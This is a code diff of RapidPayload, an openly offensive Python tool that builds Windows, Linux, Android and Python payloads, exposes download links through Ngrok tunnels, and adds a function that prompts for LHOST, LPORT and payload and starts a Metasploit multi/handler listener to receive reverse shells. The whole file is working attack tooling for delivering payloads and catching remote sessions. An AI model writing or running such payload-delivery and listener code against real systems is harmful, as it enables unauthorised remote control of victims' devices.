@@ -1,9 +1,8 @@
-#!/usr/bin/env python3
+#!/usr/bin/python
 #-*- coding: utf-8 -*-
 #https://github.com/AngelSecurityTeam/RapidPayload
 import os
-import re
-import platform
+import platform,subprocess,re
 from time import sleep
 cyan= '\033[36m'
 bold= '\033[1m'
@@ -134,13 +133,19 @@ def Ngrok():
     url = urlFile.read()
     urlFile.close()
     if re.match("https://[0-9a-z]*\.ngrok.io", url) != None:
-      linkngrok=url+'/'+name1  		
+      linkngrok=url+'/'+name1		
       print("\n\033[1m\033[36mRapidPayload:~/LinkNgrok# \033[1m\033[0m"+linkngrok)
    
     print(" ")	
 
 def MSF():
-	 os.system("bash msf.sh")     
+    host1=input("\n{0}{1}RapidPayload:~/LHOST# {2}".format(cyan, bold, end))
+    port1=input("\n{0}{1}RapidPayload:~/LPORT# {2}".format(cyan, bold, end))
+    payload1=input("\n{0}{1}RapidPayload:~/PAYLOAD# {2}".format(cyan, bold, end))   
+    datamsf = "use exploit/multi/handler;set PAYLOAD "+payload1+";set LHOST "+host1+";set LPORT "+port1+";run"
+    subprocess.call(["msfconsole", "-q" ,"-x", datamsf])    
+         
+     
 def RapidP():
     
     select = input('\n{2}{0}{2}[{1}{2}1{0}]{2}{1} {2}Windows\n{0}{2}[{1}{2}2{2}{0}]{1} {2}Linux\n{0}{2}[{1}{2}3{2}{0}]{1} {2}Android\n{0}{2}[{1}{2}{2}4{0}]{1} {2}Python\n{0}{2}[{1}{2}{2}5{0}]{1} {2}Connect_Ngrok\n{0}{2}[{1}{2}{2}6{0}]{1} {2}Connect_MSF\n{0}{0}[{1}{2}0{0}]{1} {2}Exit\n\n{0}{2}RapidPayload:~#{1} '.format(cyan, end, bold))
